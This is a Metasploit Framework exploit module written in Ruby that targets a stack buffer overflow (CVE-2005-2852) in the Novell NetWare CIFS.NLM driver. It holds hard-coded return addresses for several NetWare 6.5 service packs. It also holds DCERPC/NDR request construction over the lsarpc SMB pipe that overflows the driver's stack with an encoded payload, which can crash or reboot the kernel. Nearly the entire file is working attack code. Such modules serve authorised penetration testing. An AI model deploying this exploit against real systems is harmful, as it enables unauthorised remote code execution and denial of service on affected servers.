##
# $Id: lsass_cifs.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in the NetWare CIFS.NLM driver.
				Since the driver runs in the kernel space, a failed exploit attempt can
				cause the OS to reboot.
			},
			'Author'         =>
				[
					'toto',
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2005-2852' ],
					[ 'OSVDB', '12790' ]
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00",
				},
			'Platform'       => 'netware',
			'Targets'        =>
				[
					# NetWare SP can be found in the SNMP version :
					# 5.70.07 -> NetWare 6.5 (5.70) SP7 (07)

					[ 'VMware',   { 'Ret' => 0x000f142b } ],
					[ 'NetWare 6.5 SP2', { 'Ret' => 0xb2329b98 } ], # push esp - ret (libc.nlm)
					[ 'NetWare 6.5 SP3', { 'Ret' => 0xb234a268 } ], # push esp - ret (libc.nlm)
					[ 'NetWare 6.5 SP4', { 'Ret' => 0xbabc286c } ], # push esp - ret (libc.nlm)
					[ 'NetWare 6.5 SP5', { 'Ret' => 0xbabc9c3c } ], # push esp - ret (libc.nlm)
					[ 'NetWare 6.5 SP6', { 'Ret' => 0x823c835c } ], # push esp - ret (libc.nlm)
					[ 'NetWare 6.5 SP7', { 'Ret' => 0x823c83fc } ], # push esp - ret (libc.nlm)
				],

			'DisclosureDate' => 'Jan 21 2007'))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use (LSARPC)", 'lsarpc'])
			], self.class)

	end

	def exploit

		# Force multi-bind off (netware doesn't support it)
		datastore['DCERPC::fake_bind_multi'] = false

		connect()
		smb_login()

		handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', ["\\#{datastore['SMBPIPE']}"])

		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		stb =
			NDR.long(rand(0xffffffff)) +
			NDR.UnicodeConformantVaryingString("\\\\#{datastore['RHOST']}") +
			NDR.long(0) +
			NDR.long(0) +
			NDR.long(0) +
			NDR.long(0) +
			NDR.long(0) +
			NDR.long(0) +
			NDR.long(0x000f0fff)

		resp = dcerpc.call(0x2c, stb)
		handle, = resp[0,20]
		code, = resp[20, 4].unpack('V')

		name =
			rand_text_alphanumeric(0xa0) +
			[target.ret].pack('V') +
			payload.encoded

		stb =
			handle +
			NDR.long(1) +
			NDR.long(1) +

			NDR.short(name.length) +
			NDR.short(name.length) +
			NDR.long(rand(0xffffffff)) +

			NDR.UnicodeConformantVaryingStringPreBuilt(name) +

			NDR.long(0) +
			NDR.long(0) +
			NDR.long(1) +
			NDR.long(0)

		print_status("Calling the vulnerable function ...")

		begin
			dcerpc.call(0x0E, stb)
		rescue
		end

		# Cleanup
		handler
		disconnect
	end

end
